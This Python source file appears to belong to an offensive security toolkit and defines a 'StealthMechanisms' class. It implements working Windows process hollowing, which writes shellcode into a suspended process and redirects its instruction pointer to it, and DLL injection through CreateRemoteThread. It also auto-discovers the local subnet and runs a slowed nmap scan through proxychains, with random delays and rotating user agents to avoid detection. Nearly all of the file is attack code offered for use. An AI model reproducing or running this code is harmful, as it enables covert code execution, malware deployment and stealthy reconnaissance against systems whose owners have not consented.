import random
import time
import platform
import subprocess
import os
import re
import socket
from colorama import Fore, Style
import yaml

# CR-11 fix: Platform guard for Windows-only imports.
# These imports fail on Linux/macOS at module load time.
IS_WINDOWS = platform.system() == 'Windows'
if IS_WINDOWS:
    import ctypes
    import ctypes.wintypes as wintypes

    # Windows API Constants for Process Hollowing
    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
    ntdll = ctypes.WinDLL('ntdll', use_last_error=True)

    PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    MEM_RELEASE = 0x8000
    PAGE_EXECUTE_READWRITE = 0x40
    PAGE_READWRITE = 0x04
    PROCESS_CREATE_THREAD = 0x00000200
    PROCESS_QUERY_INFORMATION = 0x0400
    PROCESS_VM_OPERATION = 0x0008
    PROCESS_VM_WRITE = 0x0020
    PROCESS_VM_READ = 0x0010
    CREATE_SUSPENDED = 0x00000004

    # CR-12 fix: Define proper CONTEXT structure for x64
    class CONTEXT(ctypes.Structure):
        _fields_ = [
            ("P1Home", ctypes.c_uint64),
            ("P2Home", ctypes.c_uint64),
            ("P3Home", ctypes.c_uint64),
            ("P4Home", ctypes.c_uint64),
            ("P5Home", ctypes.c_uint64),
            ("P6Home", ctypes.c_uint64),
            ("ContextFlags", ctypes.c_uint32),
            ("MxCsr", ctypes.c_uint32),
            ("SegGs", ctypes.c_uint16),
            ("SegFs", ctypes.c_uint16),
            ("SegEs", ctypes.c_uint16),
            ("SegDs", ctypes.c_uint16),
            ("SegSs", ctypes.c_uint16),
            ("SegCs", ctypes.c_uint16),
            ("EFlags", ctypes.c_uint32),
            ("Dr0", ctypes.c_uint64),
            ("Dr1", ctypes.c_uint64),
            ("Dr2", ctypes.c_uint64),
            ("Dr3", ctypes.c_uint64),
            ("Dr6", ctypes.c_uint64),
            ("Dr7", ctypes.c_uint64),
            ("Rax", ctypes.c_uint64),
            ("Rcx", ctypes.c_uint64),
            ("Rdx", ctypes.c_uint64),
            ("Rbx", ctypes.c_uint64),
            ("Rsp", ctypes.c_uint64),
            ("Rbp", ctypes.c_uint64),
            ("Rsi", ctypes.c_uint64),
            ("Rdi", ctypes.c_uint64),
            ("R8", ctypes.c_uint64),
            ("R9", ctypes.c_uint64),
            ("R10", ctypes.c_uint64),
            ("R11", ctypes.c_uint64),
            ("R12", ctypes.c_uint64),
            ("R13", ctypes.c_uint64),
            ("R14", ctypes.c_uint64),
            ("R15", ctypes.c_uint64),
            ("Rip", ctypes.c_uint64),
        ]

    # CR-14 fix: Set argtypes/restype for WinAPI calls to prevent 64-bit truncation
    kernel32.CreateProcessW.restype = wintypes.BOOL
    kernel32.CreateProcessW.argtypes = [
        wintypes.LPCWSTR, wintypes.LPWSTR, wintypes.LPVOID, wintypes.LPVOID,
        wintypes.BOOL, wintypes.DWORD, wintypes.LPVOID, wintypes.LPCWSTR,
        wintypes.LPVOID, wintypes.LPVOID
    ]
    kernel32.VirtualAllocEx.restype = ctypes.c_void_p
    kernel32.VirtualAllocEx.argtypes = [wintypes.HANDLE, ctypes.c_void_p, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
    kernel32.WriteProcessMemory.restype = wintypes.BOOL
    kernel32.WriteProcessMemory.argtypes = [wintypes.HANDLE, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
    kernel32.GetThreadContext.restype = wintypes.BOOL
    kernel32.GetThreadContext.argtypes = [wintypes.HANDLE, ctypes.POINTER(CONTEXT)]
    kernel32.SetThreadContext.restype = wintypes.BOOL
    kernel32.SetThreadContext.argtypes = [wintypes.HANDLE, ctypes.POINTER(CONTEXT)]
    kernel32.ResumeThread.restype = wintypes.DWORD
    kernel32.ResumeThread.argtypes = [wintypes.HANDLE]
    kernel32.OpenProcess.restype = wintypes.HANDLE
    kernel32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
    kernel32.CreateRemoteThread.restype = wintypes.HANDLE
    kernel32.CreateRemoteThread.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, ctypes.c_void_p, ctypes.c_void_p, wintypes.DWORD, wintypes.LPVOID]
    kernel32.VirtualFreeEx.restype = wintypes.BOOL
    kernel32.VirtualFreeEx.argtypes = [wintypes.HANDLE, ctypes.c_void_p, ctypes.c_size_t, wintypes.DWORD]
    kernel32.GetProcAddress.restype = ctypes.c_void_p
    kernel32.GetProcAddress.argtypes = [wintypes.HMODULE, wintypes.LPCSTR]
    kernel32.GetModuleHandleW.restype = wintypes.HMODULE
    kernel32.GetModuleHandleW.argtypes = [wintypes.LPCWSTR]
    kernel32.CloseHandle.restype = wintypes.BOOL
    kernel32.CloseHandle.argtypes = [wintypes.HANDLE]

    class STARTUPINFO(ctypes.Structure):
        _fields_ = [
            ("cb", wintypes.DWORD),
            ("lpReserved", wintypes.LPWSTR),
            ("lpDesktop", wintypes.LPWSTR),
            ("lpTitle", wintypes.LPWSTR),
            ("dwX", wintypes.DWORD),
            ("dwY", wintypes.DWORD),
            ("dwXSize", wintypes.DWORD),
            ("dwYSize", wintypes.DWORD),
            ("dwXCountChars", wintypes.DWORD),
            ("dwYCountChars", wintypes.DWORD),
            ("dwFillAttribute", wintypes.DWORD),
            ("dwFlags", wintypes.DWORD),
            ("wShowWindow", wintypes.WORD),
            ("cbReserved2", wintypes.WORD),
            ("lpReserved2", wintypes.LPBYTE),
            ("hStdInput", wintypes.HANDLE),
            ("hStdOutput", wintypes.HANDLE),
            ("hStdError", wintypes.HANDLE),
        ]

    class PROCESS_INFORMATION(ctypes.Structure):
        _fields_ = [
            ("hProcess", wintypes.HANDLE),
            ("hThread", wintypes.HANDLE),
            ("dwProcessId", wintypes.DWORD),
            ("dwThreadId", wintypes.DWORD),
        ]

    class MEMORY_BASIC_INFORMATION(ctypes.Structure):  # noqa: already correct
        _fields_ = [
            ("BaseAddress", ctypes.c_void_p),
            ("AllocationBase", ctypes.c_void_p),
            ("AllocationProtect", wintypes.DWORD),
            ("RegionSize", ctypes.c_size_t),
            ("State", wintypes.DWORD),
            ("Protect", wintypes.DWORD),
            ("Type", wintypes.DWORD),
        ]


class StealthMechanisms:
    def __init__(self, config):
        self.config = config
        self.stealth_profiles = ['default', 'high', 'stealth']
        self.os_type = platform.system()
        self.process_hiding_available = self._check_hiding_availability()
        self.current_user_agent = config.get('stealth', {}).get('user_agent', 'Mozilla/5.0')
        # CR-15 fix: Initialize current_profile to prevent AttributeError
        self.current_profile = 'default'

    def _check_hiding_availability(self):
        """Check if we can actually hide processes."""
        if self.os_type == 'Windows':
            try:
                import win32api, win32con
                return True
            except ImportError:
                return False
        elif self.os_type == 'Linux':
            return True
        return False

    def apply_stealth(self, profile='default'):
        if profile not in self.stealth_profiles:
            print(f"{Fore.RED}[ERROR] Invalid stealth profile: {profile}")
            return

        self.current_profile = profile
        self.current_user_agent = self.config.get('stealth', {}).get('user_agent', self.current_user_agent)

        if profile == 'stealth':
            # CR-16 fix: Use proper random delay instead of Poisson
            # (Poisson at low lambda produces mostly 0-3s, faster than uniform)
            delay_min = self.config.get('stealth', {}).get('delay_min', 1.5)
            delay_max = self.config.get('stealth', {}).get('delay_max', 3.5)
            delay = random.uniform(delay_min, delay_max)
            time.sleep(delay)
            print(f"{Fore.GREEN}[Stealth] Profile 'stealth' applied. Random delay: {delay:.2f}s")

        elif profile == 'high':
            self._run_proxy_chain()

        elif profile == 'default':
            time.sleep(random.uniform(0.5, 1.5))
            print(f"{Fore.GREEN}[Stealth] Profile 'default' applied.")

    def _discover_network_config(self):
        """
        Auto Discovery of Subnet Mask and Local IP.
        """
        print(f"{Fore.CYAN}[Network] Discovering local network configuration...")

        local_ip = None
        subnet_mask = None
        network_schema = "192.168.0.0/24"

        try:
            if self.os_type == 'Linux':
                # CR-18 fix: Use 'ip' command instead of deprecated 'ifconfig'
                result = subprocess.run(['ip', 'addr', 'show'], capture_output=True, text=True, timeout=5)
                lines = result.stdout.split('\n')

                for line in lines:
                    if 'inet ' in line and '127.0.0.1' not in line:
                        ip_match = re.search(r'inet\s+(\d+\.\d+\.\d+\.\d+)', line)
                        mask_match = re.search(r'/(\d+)', line)
                        if ip_match:
                            local_ip = ip_match.group(1)
                        if mask_match:
                            cidr = int(mask_match.group(1))
                            subnet_mask = cidr
                        break

            elif self.os_type == 'Windows':
                # CR-18 fix: Use socket to get actual local IP, not ipconfig parsing
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.connect(("8.8.8.8", 80))
                    local_ip = s.getsockname()[0]
                    s.close()
                except Exception:
                    pass

                result = subprocess.run(['ipconfig'], capture_output=True, text=True, timeout=5)
                lines = result.stdout.split('\n')

                for line in lines:
                    if local_ip and local_ip in line:
                        mask_match = re.search(r'Subnet Mask.*?:.*?(\d+\.\d+\.\d+\.\d+)', line)
                        if mask_match:
                            mask_str = mask_match.group(1)
                            # Convert dotted mask to CIDR
                            mask_parts = mask_str.split('.')
                            cidr = sum(bin(int(p)).count('1') for p in mask_parts)
                            subnet_mask = cidr
                        break

            # CR-18 fix: Calculate proper CIDR from actual mask
            if local_ip and subnet_mask:
                if isinstance(subnet_mask, int):
                    cidr = subnet_mask
                else:
                    mask_parts = str(subnet_mask).split('.')
                    cidr = sum(bin(int(p)).count('1') for p in mask_parts)

                ip_parts = local_ip.split('.')
                network_parts = [str(int(ip_parts[i]) & (0xFF << (8 - max(0, cidr - i*8)) & 0xFF)) for i in range(4)]
                network_schema = f"{'.'.join(network_parts[:max(1, (cidr+7)//8)])}/{cidr}"

                print(f"{Fore.GREEN}[Network] Found IP: {local_ip}")
                print(f"{Fore.GREEN}[Network] Auto-configured Scan Range: {network_schema}")
            else:
                print(f"{Fore.YELLOW}[Network] Auto-discovery failed. Using default 192.168.1.0/24.")
                network_schema = "192.168.1.0/24"

            return local_ip, network_schema

        except Exception as e:
            print(f"{Fore.RED}[Network] Error during discovery: {e}")
            return None, "192.168.1.0/24"

    def _run_proxy_chain(self):
        """
        Proxy Chain implementation.
        """
        print(f"{Fore.GREEN}[Stealth] Activating Proxy Chain Mode...")

        # Check if proxychains is installed
        try:
            subprocess.run(['proxychains4', '-h'], capture_output=True, check=True, timeout=5)
        except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired):
            print(f"{Fore.RED}[ERROR] 'proxychains4' not found. Please install it to use high stealth.")
            return

        # CR-17 fix: Use proper proxychains config format
        proxy_chain_config = [
            "strict_chain",
            "proxy_dns",
            "tcp_read_time_out 15000",
            "tcp_connect_time_out 8000",
            "[ProxyList]",
            "socks5 127.0.0.1 1080",
        ]

        local_ip, network_schema = self._discover_network_config()

        config_filename = "./temp_proxychains.conf"
        try:
            with open(config_filename, 'w') as f:
                for line in proxy_chain_config:
                    f.write(f"{line}\n")
            print(f"{Fore.CYAN}[Proxy] Config file created at {config_filename}")

        except Exception as e:
            print(f"{Fore.RED}[Proxy] Failed to create config: {e}")
            return

        scan_command = [
            "proxychains4", "-q", "-f", config_filename,
            "nmap", "-sV", "-T2", network_schema
        ]

        print(f"{Fore.CYAN}[Proxy] Command: {' '.join(scan_command)}")
        print(f"{Fore.CYAN}{'-'*60}")

        try:
            process = subprocess.Popen(scan_command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    print(output.strip())

            return_code = process.poll()
            if return_code == 0:
                print(f"{Fore.GREEN}[Proxy] Scan completed successfully.")
            else:
                print(f"{Fore.YELLOW}[Proxy] Scan exited with code {return_code}")

        except Exception as e:
            print(f"{Fore.RED}[ERROR] Proxy execution failed: {e}")

        if os.path.exists(config_filename):
            os.remove(config_filename)

    def random_delay(self):
        # CR-16 fix: Use uniform distribution for human-like timing
        delay_min = self.config.get('stealth', {}).get('delay_min', 1.5)
        delay_max = self.config.get('stealth', {}).get('delay_max', 3.5)
        delay = random.uniform(delay_min, delay_max)
        time.sleep(delay)
        return delay

    def process_hollowing_impl(self, process_name, shellcode):
        """
        Process Hollowing (Windows only).
        """
        if not IS_WINDOWS:
            print(f"{Fore.YELLOW}[Stealth] Process Hollowing is Windows-only.")
            return False

        si = STARTUPINFO()
        si.cb = ctypes.sizeof(STARTUPINFO)
        si.dwFlags = 0x1
        pi = PROCESS_INFORMATION()

        # CR-13 fix: Use CREATE_SUSPENDED flag so process is created suspended
        if not kernel32.CreateProcessW(
            process_name, None, None, None, False,
            CREATE_SUSPENDED, None, None, ctypes.byref(si), ctypes.byref(pi)
        ):
            print(f"{Fore.RED}[ERROR] CreateProcess failed: {ctypes.get_last_error()}")
            return False

        print(f"{Fore.CYAN}[Stealth] Process created suspended: {process_name} (PID: {pi.dwProcessId})")

        # Allocate memory in target process
        addr = kernel32.VirtualAllocEx(pi.hProcess, None, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
        if not addr:
            print(f"{Fore.RED}[ERROR] VirtualAllocEx failed.")
            kernel32.CloseHandle(pi.hProcess)
            kernel32.CloseHandle(pi.hThread)
            return False

        # Write shellcode
        written = ctypes.c_size_t(0)
        if not kernel32.WriteProcessMemory(pi.hProcess, addr, shellcode, len(shellcode), ctypes.byref(written)):
            print(f"{Fore.RED}[ERROR] WriteProcessMemory failed.")
            kernel32.CloseHandle(pi.hProcess)
            kernel32.CloseHandle(pi.hThread)
            return False

        # Get Thread Context & Patch RIP
        context = CONTEXT()
        context.ContextFlags = 0x100000 | 0x10001  # CONTEXT_AMD64 | CONTEXT_CONTROL | CONTEXT_INTEGER
        if not kernel32.GetThreadContext(pi.hThread, ctypes.byref(context)):
            print(f"{Fore.RED}[ERROR] GetThreadContext failed.")
            kernel32.CloseHandle(pi.hProcess)
            kernel32.CloseHandle(pi.hThread)
            return False

        context.Rip = addr

        if not kernel32.SetThreadContext(pi.hThread, ctypes.byref(context)):
            print(f"{Fore.RED}[ERROR] SetThreadContext failed.")
            kernel32.CloseHandle(pi.hProcess)
            kernel32.CloseHandle(pi.hThread)
            return False

        kernel32.ResumeThread(pi.hThread)
        kernel32.CloseHandle(pi.hProcess)
        kernel32.CloseHandle(pi.hThread)

        print(f"{Fore.GREEN}[Stealth] Process Hollowing successful! RIP patched to {hex(addr)}")
        return True

    def process_injection_impl(self, target_pid, dll_path):
        """
        DLL Injection (Windows only).
        """
        if not IS_WINDOWS:
            print(f"{Fore.YELLOW}[Stealth] DLL Injection is Windows-only.")
            return False

        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
        if not h_process:
            print(f"{Fore.RED}[ERROR] OpenProcess failed: {ctypes.get_last_error()}")
            return False

        h_kernel32 = kernel32.GetModuleHandleW("kernel32.dll")
        load_library_addr = kernel32.GetProcAddress(h_kernel32, "LoadLibraryA")
        if not load_library_addr:
            print(f"{Fore.RED}[ERROR] GetProcAddress LoadLibraryA failed.")
            kernel32.CloseHandle(h_process)
            return False

        dll_path_bytes = dll_path.encode('utf-8') + b'\x00'
        remote_mem = kernel32.VirtualAllocEx(h_process, None, len(dll_path_bytes), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
        if not remote_mem:
            print(f"{Fore.RED}[ERROR] VirtualAllocEx failed.")
            kernel32.CloseHandle(h_process)
            return False

        written = ctypes.c_size_t(0)
        if not kernel32.WriteProcessMemory(h_process, remote_mem, dll_path_bytes, len(dll_path_bytes), ctypes.byref(written)):
            print(f"{Fore.RED}[ERROR] WriteProcessMemory failed.")
            kernel32.VirtualFreeEx(h_process, remote_mem, 0, MEM_RELEASE)
            kernel32.CloseHandle(h_process)
            return False

        thread_id = wintypes.DWORD(0)
        h_thread = kernel32.CreateRemoteThread(h_process, None, 0, load_library_addr, remote_mem, 0, ctypes.byref(thread_id))
        if not h_thread:
            print(f"{Fore.RED}[ERROR] CreateRemoteThread failed.")
            kernel32.CloseHandle(h_process)
            kernel32.VirtualFreeEx(h_process, remote_mem, 0, MEM_RELEASE)
            return False

        print(f"{Fore.GREEN}[Stealth] Injection successful! Thread ID: {thread_id.value}")

        kernel32.CloseHandle(h_thread)
        kernel32.CloseHandle(h_process)
        return True

    def set_random_user_agent(self):
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
        ]
        self.current_user_agent = random.choice(user_agents)
        return self.current_user_agent
